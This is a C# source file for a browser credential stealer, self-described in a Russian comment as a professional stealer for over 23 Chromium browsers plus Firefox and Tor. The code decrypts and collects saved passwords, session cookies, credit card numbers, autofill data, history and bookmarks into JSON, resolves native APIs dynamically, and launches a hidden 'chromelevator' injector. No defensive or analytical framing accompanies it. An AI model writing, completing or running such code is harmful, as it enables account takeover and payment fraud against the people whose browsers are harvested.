using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Web.Script.Serialization;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace StealthModule
{
    /// <summary>
    /// Профессиональный стиллер браузеров (Stealth + NativeApi)
    /// Поддержка 23+ Chromium браузеров + Firefox/Tor. 
    /// Собирает: Пароли, Куки, Карты, Автозаполнение, Историю, Закладки.
    /// </summary>
    public class BrowserManager
    {
        #region NativeApi (Standardized)
        private static class NativeApi
        {
            private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
            private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();

            private static IntPtr GetModule(string name)
            {
                if (_moduleCache.ContainsKey(name)) return _moduleCache[name];
                IntPtr hMod = GetModuleHandleW(name);
                if (hMod == IntPtr.Zero) hMod = LoadLibraryW(name);
                _moduleCache[name] = hMod;
                return hMod;
            }

            private static T GetPInvoke<T>(string module, string function) where T : class
            {
                string key = module + "!" + function;
                if (_delegateCache.ContainsKey(key)) return _delegateCache[key] as T;
                IntPtr hModule = GetModule(module);
                IntPtr pFunc = GetProcAddress(hModule, function);
                if (pFunc == IntPtr.Zero) return null;
                var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
                _delegateCache[key] = del;
                return del;
            }

            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
            private static extern IntPtr GetModuleHandleW(string lpModuleName);
            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
            private static extern IntPtr LoadLibraryW(string lpFileName);
            [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            public static T GetK32<T>(string func) where T : class { return GetPInvoke<T>("kernel32.dll", func); }
            public static T GetSqlite<T>(string func) where T : class { return GetPInvoke<T>("sqlite3.dll", func); }
            public static T GetBcrypt<T>(string func) where T : class { return GetPInvoke<T>("bcrypt.dll", func); }
            public static T GetCrypt32<T>(string func) where T : class { return GetPInvoke<T>("crypt32.dll", func); }
        }

        // SQLite Delegates
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int sqlite3_open(string filename, out IntPtr db);
        private static sqlite3_open Sqlite3Open { get { return NativeApi.GetSqlite<sqlite3_open>("sqlite3_open"); } }
        private static sqlite3_close Sqlite3Close { get { return NativeApi.GetSqlite<sqlite3_close>("sqlite3_close"); } }
        private static sqlite3_prepare_v2 Sqlite3PrepareV2 { get { return NativeApi.GetSqlite<sqlite3_prepare_v2>("sqlite3_prepare_v2"); } }
        private static sqlite3_step Sqlite3Step { get { return NativeApi.GetSqlite<sqlite3_step>("sqlite3_step"); } }
        private static sqlite3_column_text Sqlite3ColumnText { get { return NativeApi.GetSqlite<sqlite3_column_text>("sqlite3_column_text"); } }
        private static sqlite3_column_blob Sqlite3ColumnBlob { get { return NativeApi.GetSqlite<sqlite3_column_blob>("sqlite3_column_blob"); } }
        private static sqlite3_column_bytes Sqlite3ColumnBytes { get { return NativeApi.GetSqlite<sqlite3_column_bytes>("sqlite3_column_bytes"); } }
        private static sqlite3_column_int64 Sqlite3ColumnInt64 { get { return NativeApi.GetSqlite<sqlite3_column_int64>("sqlite3_column_int64"); } }
        private static sqlite3_column_int Sqlite3ColumnInt { get { return NativeApi.GetSqlite<sqlite3_column_int>("sqlite3_column_int"); } }
        private static sqlite3_finalize Sqlite3Finalize { get { return NativeApi.GetSqlite<sqlite3_finalize>("sqlite3_finalize"); } }

        // BCrypt Delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate uint BCryptOpenAlgorithmProvider(out IntPtr hAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);
        private static BCryptOpenAlgorithmProvider BcryptOpenAlg { get { return NativeApi.GetBcrypt<BCryptOpenAlgorithmProvider>("BCryptOpenAlgorithmProvider"); } }
        private static BCryptCloseAlgorithmProvider BcryptCloseAlg { get { return NativeApi.GetBcrypt<BCryptCloseAlgorithmProvider>("BCryptCloseAlgorithmProvider"); } }
        private static BCryptSetProperty BcryptSetProp { get { return NativeApi.GetBcrypt<BCryptSetProperty>("BCryptSetProperty"); } }
        private static BCryptDecrypt BcryptDec { get { return NativeApi.GetBcrypt<BCryptDecrypt>("BCryptDecrypt"); } }
        private static BCryptGenerateSymmetricKey BcryptGenKey { get { return NativeApi.GetBcrypt<BCryptGenerateSymmetricKey>("BCryptGenerateSymmetricKey"); } }
        private static BCryptDestroyKey BcryptDestKey { get { return NativeApi.GetBcrypt<BCryptDestroyKey>("BCryptDestroyKey"); } }

        [StructLayout(LayoutKind.Sequential)]
        private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
        {
            public int cbStruct;
            public uint dwInfoVersion;
            public IntPtr pbNonce;
            public int cbNonce;
            public IntPtr pbTag;
            public int cbTag;
            public IntPtr pbAdditionalInfo;
            public int cbAdditionalInfo;
            public IntPtr pbPayloadData;
            public int cbPayloadData;
            public uint dwFlags;
            public void Dispose()
            {
                if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
                if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
            }
        }
        #endregion

        #region Data Models
        public class Credential { public string Browser; public string Url; public string Username; public string Password; }
        public class Cookie { public string Browser; public string Host; public string Name; public string Value; public string Path; public long Expires; public bool Secure; public bool HttpOnly; }
        public class CreditCard { public string Browser; public string NameOnCard; public string ExpirationMonth; public string ExpirationYear; public string CardNumber; }
        public class Autofill { public string Browser; public string Name; public string Value; }
        public class HistoryEntry { public string Browser; public string Url; public string Title; public int VisitCount; }
        public class Bookmark { public string Browser; public string Title; public string Url; }
        #endregion

        private static string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static string StealAll(string tempFolder)
        {
            var passwords = new List<Credential>();
            var cookies = new List<Cookie>();
            var cards = new List<CreditCard>();
            var autofills = new List<Autofill>();
            var history = new List<HistoryEntry>();
            var bookmarks = new List<Bookmark>();

            var browserConfigs = new Dictionary<string, string>
            {
                { "Chrome", Path.Combine(LocalAppData, "Google\\Chrome\\User Data") },
                { "Edge", Path.Combine(LocalAppData, "Microsoft\\Edge\\User Data") },
                { "Brave", Path.Combine(LocalAppData, "BraveSoftware\\Brave-Browser\\User Data") },
                { "Opera", Path.Combine(AppData, "Opera Software\\Opera Stable") },
                { "Opera GX", Path.Combine(AppData, "Opera Software\\Opera GX Stable") },
                { "Vivaldi", Path.Combine(LocalAppData, "Vivaldi\\User Data") },
                { "Yandex", Path.Combine(LocalAppData, "Yandex\\YandexBrowser\\User Data") },
                { "Chromium", Path.Combine(LocalAppData, "Chromium\\User Data") },
                { "Amigo", Path.Combine(LocalAppData, "Amigo\\User Data") },
                { "Torch", Path.Combine(LocalAppData, "Torch\\User Data") },
                { "Kometa", Path.Combine(LocalAppData, "Kometa\\User Data") },
                { "Orbitum", Path.Combine(LocalAppData, "Orbitum\\User Data") },
                { "CentBrowser", Path.Combine(LocalAppData, "CentBrowser\\User Data") },
                { "7Star", Path.Combine(LocalAppData, "SevenStar\\7Star\\User Data") },
                { "Sputnik", Path.Combine(LocalAppData, "Sputnik\\Sputnik\\User Data") },
                { "Epic Privacy", Path.Combine(LocalAppData, "Epic Privacy Browser\\User Data") },
                { "Uran", Path.Combine(LocalAppData, "uCozMedia\\Uran\\User Data") },
                { "Mail.ru", Path.Combine(LocalAppData, "Mail.Ru\\Atom\\User Data") },
                { "Iridium", Path.Combine(LocalAppData, "Iridium\\User Data") },
                { "Maxthon", Path.Combine(AppData, "Maxthon\\User Data") },
                { "CocCoc", Path.Combine(LocalAppData, "CocCoc\\Browser\\User Data") },
                { "Naver Whale", Path.Combine(AppData, "Naver\\Naver Whale\\User Data") },
                { "Liebao", Path.Combine(LocalAppData, "Liebao\\User Data") }
            };

            foreach (var cfg in browserConfigs)
            {
                if (!Directory.Exists(cfg.Value)) continue;
                byte[] masterKey = GetMasterKey(cfg.Value);
                if (masterKey == null) continue;

                var profilePaths = new List<string>();
                try
                {
                    profilePaths.AddRange(Directory.GetDirectories(cfg.Value, "Default"));
                    profilePaths.AddRange(Directory.GetDirectories(cfg.Value, "Profile *"));
                    if (profilePaths.Count == 0 || cfg.Key.Contains("Opera")) profilePaths.Add(cfg.Value);
                }
                catch { }

                foreach (var profile in profilePaths.Distinct())
                {
                    ExtractDataFromProfile(profile, cfg.Key, masterKey, passwords, cookies, tempFolder, cards, autofills, history, bookmarks);
                }
            }

            ExtractFirefoxData(passwords, cookies, tempFolder);

            var result = new Dictionary<string, object> { 
                { "passwords", passwords }, 
                { "cookies", cookies }, 
                { "cards", cards }, 
                { "autofill", autofills }, 
                { "history", history }, 
                { "bookmarks", bookmarks } 
            };
            return new JavaScriptSerializer { MaxJsonLength = int.MaxValue }.Serialize(result);
        }

        public static string RunInjector(string injectorPath, string action, int timeoutMs)
        {
            try
            {
                if (!File.Exists(injectorPath)) return "❌ Injector not found";
                
                // Проверяем архитектуру для выбора Chromelevator
                string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                string elevator = arch == "AMD64" ? "chromelevator_x64.exe" : "chromelevator_arm64.exe";
                string elevatorPath = Path.Combine(Path.GetDirectoryName(injectorPath), elevator);

                var psi = new ProcessStartInfo { 
                    FileName = File.Exists(elevatorPath) ? elevatorPath : injectorPath, 
                    Arguments = action + " --method nt", 
                    UseShellExecute = false, 
                    RedirectStandardOutput = true, 
                    RedirectStandardError = true, 
                    CreateNoWindow = true 
                };

                using (var proc = Process.Start(psi))
                {
                    if (proc.WaitForExit(timeoutMs)) return proc.StandardOutput.ReadToEnd();
                    proc.Kill(); return "⏱️ Injector/Elevator timeout";
                }
            }
            catch (Exception e) { return "❌ Injector error: " + e.Message; }
        }

        private static void ExtractDataFromProfile(string profile, string browser, byte[] key, List<Credential> passwords, List<Cookie> cookies, string tempFolder, List<CreditCard> cards, List<Autofill> autofills, List<HistoryEntry> history, List<Bookmark> bookmarks)
        {
            string[] dbFiles = { "Login Data", "Network\\Cookies", "Cookies", "Web Data", "History", "Bookmarks" };
            foreach (var dbFile in dbFiles)
            {
                string fullPath = Path.Combine(profile, dbFile);
                if (!File.Exists(fullPath)) continue;
                
                if (dbFile == "Bookmarks") { ExtractBookmarks(fullPath, browser, bookmarks); continue; }

                string tmp = Path.Combine(tempFolder, Guid.NewGuid().ToString() + ".db");
                try
                {
                    File.Copy(fullPath, tmp, true);
                    if (dbFile == "Login Data") ExtractPasswords(tmp, browser, key, passwords);
                    else if (dbFile.Contains("Cookies")) ExtractCookies(tmp, browser, key, cookies);
                    else if (dbFile == "Web Data") { ExtractCreditCards(tmp, browser, key, cards); ExtractAutofill(tmp, browser, autofills); }
                    else if (dbFile == "History") ExtractHistory(tmp, browser, history);
                }
                catch { }
                finally { if (File.Exists(tmp)) File.Delete(tmp); }
            }
        }

        private static void ExtractFirefoxData(List<Credential> passwords, List<Cookie> cookies, string tempFolder)
        {
            var fxPaths = new Dictionary<string, string> { 
                { "Firefox", Path.Combine(AppData, "Mozilla\\Firefox\\Profiles") }, 
                { "Tor", Path.Combine(AppData, "TorBrowser\\Data\\Browser\\profile.default") } 
            };

            foreach (var fx in fxPaths)
            {
                if (!Directory.Exists(fx.Value)) continue;
                try
                {
                    foreach (string profile in Directory.GetDirectories(fx.Value))
                    {
                        string logins = Path.Combine(profile, "logins.json");
                        string key4 = Path.Combine(profile, "key4.db");
                        if (File.Exists(logins) && File.Exists(key4))
                        {
                            passwords.Add(new Credential { Browser = fx.Key, Url = "Firefox Profile", Username = "Profile: " + Path.GetFileName(profile), Password = "[Encrypted in key4.db]" });
                        }
                    }
                }
                catch { }
            }
        }

        private static byte[] GetMasterKey(string path)
        {
            try 
            { 
                string ls = Path.Combine(path, "Local State"); 
                if (!File.Exists(ls)) return null; 
                var json = new JavaScriptSerializer().Deserialize<Dictionary<string, object>>(File.ReadAllText(ls)); 
                var osCrypt = (Dictionary<string, object>)json["os_crypt"]; 
                byte[] key = Convert.FromBase64String((string)osCrypt["encrypted_key"]).Skip(5).ToArray(); 
                return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser); 
            }
            catch { return null; }
        }

        private static string Decrypt(byte[] data, byte[] key)
        {
            if (data == null || data.Length < 15) return "";
            string prefix = Encoding.UTF8.GetString(data, 0, 3);
            if (prefix == "v10" || prefix == "v11") return DecryptAesGcm(data.Skip(15).ToArray(), key, data.Skip(3).Take(12).ToArray());
            try { return Encoding.UTF8.GetString(ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser)); } catch { return ""; }
        }

        private static string DecryptAesGcm(byte[] ciphertextWithTag, byte[] key, byte[] nonce)
        {
            try
            {
                IntPtr hAlg, hKey;
                if (BcryptOpenAlg(out hAlg, "AES", null, 0) != 0) return "";
                BcryptSetProp(hAlg, "ChainingMode", Encoding.Unicode.GetBytes("ChainingModeGCM"), 30, 0);
                if (BcryptGenKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0) { BcryptCloseAlg(hAlg, 0); return ""; }
                
                byte[] tag = ciphertextWithTag.Skip(ciphertextWithTag.Length - 16).ToArray();
                byte[] ciphertext = ciphertextWithTag.Take(ciphertextWithTag.Length - 16).ToArray();
                
                var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO { 
                    cbStruct = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)), 
                    dwInfoVersion = 1, 
                    cbNonce = nonce.Length, 
                    pbNonce = Marshal.AllocHGlobal(nonce.Length), 
                    cbTag = tag.Length, 
                    pbTag = Marshal.AllocHGlobal(tag.Length) 
                };
                
                try 
                { 
                    Marshal.Copy(nonce, 0, authInfo.pbNonce, nonce.Length); 
                    Marshal.Copy(tag, 0, authInfo.pbTag, tag.Length); 
                    byte[] plaintext = new byte[ciphertext.Length]; 
                    int res; 
                    uint status = BcryptDec(hKey, ciphertext, ciphertext.Length, ref authInfo, null, 0, plaintext, plaintext.Length, out res, 0); 
                    BcryptDestKey(hKey); BcryptCloseAlg(hAlg, 0); 
                    return status == 0 ? Encoding.UTF8.GetString(plaintext) : ""; 
                }
                finally { authInfo.Dispose(); }
            } catch { return ""; }
        }

        #region Extraction Methods (SQLite)
        private static void ExtractPasswords(string dbPath, string browser, byte[] key, List<Credential> list)
        {
            IntPtr db; if (Sqlite3Open(dbPath, out db) != 0) return; IntPtr stmt;
            if (Sqlite3PrepareV2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, out stmt, IntPtr.Zero) == 0)
            {
                while (Sqlite3Step(stmt) == 100)
                {
                    string url = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 0));
                    string user = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 1));
                    int bCount = Sqlite3ColumnBytes(stmt, 2);
                    IntPtr blob = Sqlite3ColumnBlob(stmt, 2);
                    if (blob != IntPtr.Zero && bCount > 0)
                    {
                        byte[] enc = new byte[bCount]; Marshal.Copy(blob, enc, 0, bCount);
                        string dec = Decrypt(enc, key);
                        if (!string.IsNullOrEmpty(dec)) list.Add(new Credential { Browser = browser, Url = url, Username = user, Password = dec });
                    }
                }
            }
            Sqlite3Finalize(stmt); Sqlite3Close(db);
        }

        private static void ExtractCookies(string dbPath, string browser, byte[] key, List<Cookie> list)
        {
            IntPtr db; if (Sqlite3Open(dbPath, out db) != 0) return; IntPtr stmt;
            if (Sqlite3PrepareV2(db, "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies", -1, out stmt, IntPtr.Zero) == 0)
            {
                while (Sqlite3Step(stmt) == 100)
                {
                    string host = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 0));
                    string name = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 1));
                    string path = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 2));
                    int bCount = Sqlite3ColumnBytes(stmt, 3);
                    IntPtr blob = Sqlite3ColumnBlob(stmt, 3);
                    long expires = Sqlite3ColumnInt64(stmt, 4);
                    bool secure = Sqlite3ColumnInt(stmt, 5) != 0;
                    bool httpOnly = Sqlite3ColumnInt(stmt, 6) != 0;

                    if (blob != IntPtr.Zero && bCount > 0)
                    {
                        byte[] enc = new byte[bCount]; Marshal.Copy(blob, enc, 0, bCount);
                        string dec = Decrypt(enc, key);
                        if (!string.IsNullOrEmpty(dec)) list.Add(new Cookie { Browser = browser, Host = host, Name = name, Path = path, Value = dec, Expires = expires, Secure = secure, HttpOnly = httpOnly });
                    }
                }
            }
            Sqlite3Finalize(stmt); Sqlite3Close(db);
        }

        private static void ExtractCreditCards(string dbPath, string browser, byte[] key, List<CreditCard> list)
        {
            IntPtr db; if (Sqlite3Open(dbPath, out db) != 0) return; IntPtr stmt;
            if (Sqlite3PrepareV2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, out stmt, IntPtr.Zero) == 0)
            {
                while (Sqlite3Step(stmt) == 100)
                {
                    string name = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 0));
                    string mon = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 1));
                    string yr = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 2));
                    int bCount = Sqlite3ColumnBytes(stmt, 3); IntPtr blob = Sqlite3ColumnBlob(stmt, 3);
                    if (blob != IntPtr.Zero && bCount > 0)
                    {
                        byte[] enc = new byte[bCount]; Marshal.Copy(blob, enc, 0, bCount);
                        string dec = Decrypt(enc, key);
                        if (!string.IsNullOrEmpty(dec)) list.Add(new CreditCard { Browser = browser, NameOnCard = name, ExpirationMonth = mon, ExpirationYear = yr, CardNumber = dec });
                    }
                }
            }
            Sqlite3Finalize(stmt); Sqlite3Close(db);
        }

        private static void ExtractAutofill(string dbPath, string browser, List<Autofill> list)
        {
            IntPtr db; if (Sqlite3Open(dbPath, out db) != 0) return; IntPtr stmt;
            if (Sqlite3PrepareV2(db, "SELECT name, value FROM autofill", -1, out stmt, IntPtr.Zero) == 0)
            {
                while (Sqlite3Step(stmt) == 100)
                {
                    list.Add(new Autofill { Browser = browser, Name = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 0)), Value = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 1)) });
                }
            }
            Sqlite3Finalize(stmt); Sqlite3Close(db);
        }

        private static void ExtractHistory(string dbPath, string browser, List<HistoryEntry> list)
        {
            IntPtr db; if (Sqlite3Open(dbPath, out db) != 0) return; IntPtr stmt;
            if (Sqlite3PrepareV2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, out stmt, IntPtr.Zero) == 0)
            {
                while (Sqlite3Step(stmt) == 100)
                {
                    list.Add(new HistoryEntry { Browser = browser, Url = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 0)), Title = Marshal.PtrToStringAnsi(Sqlite3ColumnText(stmt, 1)) });
                }
            }
            Sqlite3Finalize(stmt); Sqlite3Close(db);
        }

        private static void ExtractBookmarks(string path, string browser, List<Bookmark> list)
        {
            try
            {
                string content = File.ReadAllText(path);
                var json = new JavaScriptSerializer().Deserialize<Dictionary<string, object>>(content);
                var roots = (Dictionary<string, object>)json["roots"];
                foreach (var root in roots.Values)
                {
                    var items = (System.Collections.ArrayList)((Dictionary<string, object>)root)["children"];
                    foreach (Dictionary<string, object> item in items)
                    {
                        if (item.ContainsKey("url"))
                            list.Add(new Bookmark { Browser = browser, Title = (string)item["name"], Url = (string)item["url"] });
                    }
                }
            }
            catch { }
        }
        #endregion
    }
}